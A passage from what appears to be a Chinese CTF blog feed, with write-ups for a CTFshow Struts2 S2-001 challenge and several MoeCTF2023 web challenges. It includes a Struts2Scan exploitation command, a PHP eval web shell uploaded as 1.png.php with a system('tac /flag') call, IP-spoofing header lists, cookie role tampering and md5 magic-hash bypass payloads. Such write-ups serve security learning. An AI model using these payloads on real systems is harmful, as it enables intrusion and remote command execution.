        <content type="html"><![CDATA[<h3 id="web279-300"><a href="#web279-300" class="headerlink" title="web279-300"></a>web279-300</h3><p><a href="https://www.secrss.com/articles/24780">å²ä¸Šæœ€å…¨Struts 2æ¼æ´å¤ç°è¿‡ç¨‹åŠPoCåˆé›†</a></p><h4 id="web279-struts2æ¼æ´-S2-001"><a href="#web279-struts2æ¼æ´-S2-001" class="headerlink" title="web279(struts2æ¼æ´ S2-001)"></a>web279(struts2æ¼æ´ S2-001)</h4><p><a href="https://www.freebuf.com/column/224041.html">Vulhubæ¼æ´ç³»åˆ—ï¼šstruts2æ¼æ´ S2-001</a></p><p>åˆšå¼€å§‹åªå­¦äº†åŸºç¡€çš„Javaç±»ï¼ŒPocä¸­çš„ä¸€äº›æ„é€ æ–¹æ³•è¿˜æœªæ¥è§¦ï¼Œæ‰€ä»¥åˆšå¼€å§‹ç”¨äº†<a href="https://github.com/wyzmgmdg/Struts2Scan">Struts2Scan</a>é€šæ€è„šæœ¬</p><p>æ£€æµ‹ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://08c8e9cf-4a7b-458f-b75b-2f2bdeae6c1b.chall.ctf.show:8080/S2-001/login.action</code></pre><p>åˆ©ç”¨ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://22350c9d-7de9-4d0c-9e56-b26cd771f1dd.challenge.ctf.show/S2-001/login.action <span class="token parameter variable">-n</span> S2-001 <span class="token parameter variable">--exec</span></code></pre><p>æ‰§è¡Œå‘½ä»¤envå³å¯å¾—åˆ°flag</p><p><strong>è¿™é›†è´¸å¤ªéš¾äº†ï¼Œå…ˆç¼“ç¼“</strong></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2023-web</title>
      <link href="/2024/07/14/MoeCTF2023-web/"/>
      <url>/2024/07/14/MoeCTF2023-web/</url>
      
        <content type="html"><![CDATA[<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><pre class="language-php" data-language="php"><code class="language-php">this is <span class="token constant">GET</span> method<span class="token punctuation">,</span>         your mission<span class="token punctuation">:</span>        <span class="token number">1.</span><span class="token keyword">use</span> <span class="token package">parameter</span><span class="token punctuation">:</span> UwU<span class="token operator">=</span>u        <span class="token number">2.</span>post <span class="token operator">**</span>form<span class="token operator">**</span><span class="token punctuation">:</span> Luv<span class="token operator">=</span>u        <span class="token number">3.</span><span class="token keyword">use</span> <span class="token package">admin</span> character        <span class="token number">4.</span>request from <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>        <span class="token number">5.</span><span class="token keyword">use</span> <span class="token package">browser</span> <span class="token string single-quoted-string">'MoeBrowser'</span>        Complete All Missions</code></pre><p>è€ƒå¯ŸåŸºç¡€çš„httpåè®®</p><p><img src="easy.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">NewStarCTF2023</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">newstarctf.com</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">power=ctfer</span></span><span class="token header"><span class="token header-name keyword">X-Real-Ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-Ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>secret=n3wst4rCTF2023g00000dä¼ªé€ IP<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Client-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Rriginating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-addr</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">HTTP_CLIENT_IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Real-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Originating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">via</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1  ä»£ç†</span></span></code></pre><h4 id="webå…¥é—¨æŒ‡åŒ—"><a href="#webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="webå…¥é—¨æŒ‡åŒ—"></a>webå…¥é—¨æŒ‡åŒ—</h4><p>æ–‡æœ«æœ‰ä¸€ä¸²å¯†æ–‡</p><p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d</p><p>è¿™æ˜¯ä¸€ä¸²16è¿›åˆ¶ç¼–ç ï¼Œè§£ç å¾—åˆ°</p><p>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p><p>flagçš„å†…å®¹è§£ç å¾—åˆ°</p><p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p><h4 id="å½¼å²¸çš„flag"><a href="#å½¼å²¸çš„flag" class="headerlink" title="å½¼å²¸çš„flag"></a>å½¼å²¸çš„flag</h4><p>F12æºç ä¸­è¢«æ’¤å›çš„æ¶ˆæ¯é‚£é‡Œæœ‰flag</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>é™„ä»¶ä¸­æœ‰ä¸€äº›apiè¯´æ˜</p><p>æ³¨å†Œ <code>POST /register</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>ç™»å½• <code>POST /login</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>è·å–flag <code>GET /flag</code></p><p>æŸ¥è¯¢æœåŠ¡çŠ¶æ€ &#96;GET &#x2F;status</p><p>æŒ‰ç…§æµç¨‹æ³¨å†Œå¹¶ç™»é™†åï¼Œè¿”å›äº†Cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">token=eyJ1c2VybmFtZSI6ICJoc2FkIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ==;</span></span>base64decodeï¼š&#123;"username": "hsad", "password": "123456", "role": "user"&#125;</code></pre><p>å°†<code>role</code>æ”¹ä¸ºadminå¹¶ä½œä¸ºCookieè®¿é—®&#x2F;flagå¾—åˆ°flag</p><h4 id="gas-gas-gas-Spider"><a href="#gas-gas-gas-Spider" class="headerlink" title="gas!gas!gas!(Spider)"></a>gas!gas!gas!(Spider)</h4><p>å¦‚ä½•æ¼‚ç§»</p><ol><li>æ²¹é—¨å¤§è½®èƒè½¬é€Ÿé«˜ç©ºè½¬ï¼ŒæŠ“åœ°åŠ›å°±å°ï¼Œåä¹‹æŠ“åœ°åŠ›å¤§</li><li>ä¿æŒåæ‰“ï¼Œæ ¹æ®å¼¯æ–¹å‘æç¤ºï¼Œåæ‰“åå‘</li><li>åœ¨0.5så†…å¿«é€Ÿååº”ï¼Œå¹¶åšæŒä¸‹æ¥äº”è½®</li><li>é‡æ–°éšä¾¿æäº¤ä¸€æ¬¡æ“ä½œæ¥é‡æ–°å¼€å§‹</li></ol><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;   &lt;label for&#x3D;&quot;driver&quot;&gt;é€‰æ‰‹:&lt;&#x2F;label&gt;   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;      &lt;label for&#x3D;&quot;steering_control&quot;&gt;æ–¹å‘æ§åˆ¶:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;     &lt;option value&#x3D;&quot;-1&quot;&gt;å·¦&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;0&quot; selected&gt;ç›´è¡Œ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;å³&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;   &lt;label for&#x3D;&quot;throttle&quot;&gt;æ²¹é—¨æ§åˆ¶:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;     &lt;option value&#x3D;&quot;0&quot;&gt;æ¾å¼€&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;ä¿æŒ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;2&quot; selected&gt;å…¨å¼€&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt; &lt;&#x2F;form&gt;</code></pre><p>æ ¹æ®è¿”å›çš„æç¤ºæ¥æ”¹å˜æ¯æ¬¡èµ›è½¦çš„æ“ä½œï¼Œä¸è¿‡æœ‰æ—¶é—´é™åˆ¶ï¼Œæ‰€ä»¥è¦ç¼–å†™è„šæœ¬å®Œæˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://localhost:3906/'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token string">"driver=hsad&amp;steering_control=0&amp;throttle=0&#125;"</span>post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token operator">=</span>url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>post_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>steering_control <span class="token operator">=</span> <span class="token number">0</span>throttle <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“å‘å·¦'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“å‘å³'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“ç›´è¡Œ'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'ä¿æŒè¿™ä¸ªé€Ÿåº¦'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'æŠ“åœ°åŠ›å¤ªå¤§äº†'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token string">'æŠ“åœ°åŠ›å¤ªå°äº†'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">0</span>    steering_control_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'-1'</span><span class="token punctuation">:</span> <span class="token string">'å·¦'</span><span class="token punctuation">,</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'ç›´è¡Œ'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'å³'</span>    <span class="token punctuation">&#125;</span>    throttle_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'æ¾å¼€'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'ä¿æŒ'</span><span class="token punctuation">,</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'å…¨å¼€'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>steering_control<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>throttle<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token operator">=</span>url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=hsad&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        headers<span class="token operator">=</span>headers    <span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    </code></pre><h4 id="moeå›¾åºŠ-æ–‡ä»¶ä¸Šä¼ "><a href="#moeå›¾åºŠ-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="moeå›¾åºŠ(æ–‡ä»¶ä¸Šä¼ )"></a>moeå›¾åºŠ(æ–‡ä»¶ä¸Šä¼ )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">const</span> allowedExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> <span class="token constant">fileExtension</span> <span class="token operator">=</span> file<span class="token operator">.</span>name<span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExtensions<span class="token operator">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fileExtension<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'åªå…è®¸ä¸Šä¼ åç¼€åä¸ºpngçš„æ–‡ä»¶ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span></code></pre><p>å®¡è®¡æºç æ—¶å‘ç°ï¼Œåªæ˜¯ç®€å•çš„ç”¨<code>.</code>ä½œä¸ºåˆ†éš”åˆ¤æ–­äº†ç¬¬ä¸€ä¸ªåç¼€åï¼Œäºæ˜¯ä¸Šä¼ </p><pre class="language-php" data-language="php"><code class="language-php">1.png.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>GET: http://localhost:6472/uploads/1.png.phpPOST: attack=system('tac /flag');</code></pre><h4 id="å¤§æµ·æé’ˆ"><a href="#å¤§æµ·æé’ˆ" class="headerlink" title="å¤§æµ·æé’ˆ"></a>å¤§æµ·æé’ˆ</h4><p>æ‰“å¼€é¢˜ç›®å¯è§åªéœ€è¦bpè·‘ä¸€åˆ°ä¸€åƒçš„æ•°å­—å³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1000</span><span class="token operator">></span> to connect to different parallel universes</code></pre><h4 id="meoå›¾åºŠ-æ–‡ä»¶åŒ…å«-md5"><a href="#meoå›¾åºŠ-æ–‡ä»¶åŒ…å«-md5" class="headerlink" title="meoå›¾åºŠ(æ–‡ä»¶åŒ…å« md5)"></a>meoå›¾åºŠ(æ–‡ä»¶åŒ…å« md5)</h4><p>è¿™æ¬¡å¢åŠ äº†æ–‡ä»¶å¤´æ£€æµ‹äºæ˜¯åŠ ä¸Š<code>GIF89a</code>äºæ˜¯ä¸Šä¼ æˆåŠŸï¼Œä¸è¿‡å‘ç°å¹¶ä¸æ˜¯ç›´æ¥ç»™å‡ºæ–‡ä»¶ç›®å½•ï¼Œè€Œæ˜¯é€šè¿‡å‚æ•°ä¼ é€’ï¼Œäºæ˜¯çŒœæµ‹æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="meo%E5%9B%BE%E5%BA%8A.png" loading="lazy"></p><p>å¾—åˆ°æç¤ºè®¿é—®<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ç®€å•çš„md5ç»•è¿‡ï¼Œå¯ä»¥æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥md5 0eç»•è¿‡</p><pre class="language-php" data-language="php"><code class="language-php">Payloadï¼šparam1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token number">240610708</span>    <span class="token constant">QLTHNDT</span> <span class="token operator">-></span> <span class="token property">0e405967825401955372549139051580</span>    <span class="token constant">QNKCDZO</span> <span class="token operator">-></span> <span class="token property">0e830400451993494058024219903391</span>     s878926199a <span class="token operator">-></span> <span class="token property">0e545993274517709034328855841020</span>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">11</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">22</span></code></pre><h4 id="å¤ºå‘½åä¸‰æª-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å¤ºå‘½åä¸‰æª-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å¤ºå‘½åä¸‰æª(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)"></a>å¤ºå‘½åä¸‰æª(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'å¤ºå‘½åä¸‰æª'</span><span class="token punctuation">;</span><span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:&#123;s:5:"Chant";s:15:"å¤ºå‘½åä¸‰æª";s:11:"Spear_Owner";s:6:"Nobody";&#125;Far away from COOL...</code></pre><p>çœ‹åˆ°äº†<code>require_once(&#39;Hanxin.exe.php&#39;);</code></p><p>Hanxin.exe.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token 